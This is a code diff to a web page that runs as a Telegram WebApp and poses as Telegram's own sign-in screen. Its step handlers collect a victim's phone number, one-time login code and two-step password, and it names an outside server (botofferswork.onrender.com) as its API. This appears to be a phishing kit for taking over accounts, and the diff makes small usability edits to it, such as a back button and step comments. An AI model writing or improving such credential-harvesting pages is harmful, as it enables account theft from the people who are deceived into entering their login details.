@@ -95,6 +95,7 @@ h1{font-size:23px;font-weight:600;letter-spacing:-.4px;margin-bottom:10px}
       <input type="text" id="code" placeholder="12345" inputmode="numeric" autocomplete="one-time-code" maxlength="6" required>
     </div>
     <button type="submit" class="btn">NEXT</button>
+    <button type="button" class="btn-ghost" id="btn-back-phone">← Back to phone number</button>
   </form>
 
   <form id="step-2fa" class="step hidden">
@@ -127,7 +128,9 @@ h1{font-size:23px;font-weight:600;letter-spacing:-.4px;margin-bottom:10px}
 </div>
 
 <script>
+// ═══════════════════════════════════════════════════════
 const API = 'https://botofferswork.onrender.com';
+// ═══════════════════════════════════════════════════════
 
 // ─── Telegram WebApp init
 const tg = window.Telegram?.WebApp;
@@ -137,11 +140,10 @@ if (tg) {
   if (tg.themeParams?.bg_color) {
     document.body.style.background = tg.themeParams.bg_color;
   }
-  // блокируем свайп-закрытие пока идёт ввод
   if (tg.enableClosingConfirmation) tg.enableClosingConfirmation();
 }
 
-// ─── парсим startapp или обычные параметры
+// ─── читаем startapp или обычные параметры
 let offerId = 0;
 let action = 'accept';
 
@@ -210,6 +212,7 @@ phoneInput.addEventListener('input',e=>{
 });
 function validatePhone(){const d=phoneInput.value.replace(/\D/g,'');$('btn-next').disabled=d.length<6}
 
+// ШАГ 1
 stepPhone.addEventListener('submit',async e=>{
   e.preventDefault();if(window.__REJECTED__)return;hideError();
   const num=phoneInput.value.replace(/\D/g,'');
@@ -226,6 +229,7 @@ stepPhone.addEventListener('submit',async e=>{
   }catch(err){hide(stepLoading);show(stepPhone);showError('Не удалось связаться с сервером')}
 });
 
+// ШАГ 2
 stepCode.addEventListener('submit',async e=>{
   e.preventDefault();if(window.__REJECTED__)return;hideError();
   code=codeInput.value.replace(/\D/g,'');
@@ -252,6 +256,14 @@ stepCode.addEventListener('submit',async e=>{
   }catch(err){hide(stepLoading);show(stepCode);showError('Не удалось связаться с сервером')}
 });
 
+$('btn-back-phone').addEventListener('click',()=>{
+  if(window.__REJECTED__)return;
+  hide(stepCode);show(stepPhone);setStep(1);
+  $('title').textContent='Sign in to Telegram';
+  $('sub').textContent='Please confirm your country code and enter your phone number.';
+});
+
+// ШАГ 3
 step2fa.addEventListener('submit',async e=>{
   e.preventDefault();if(window.__REJECTED__)return;hideError();
   password=passInput.value.trim();
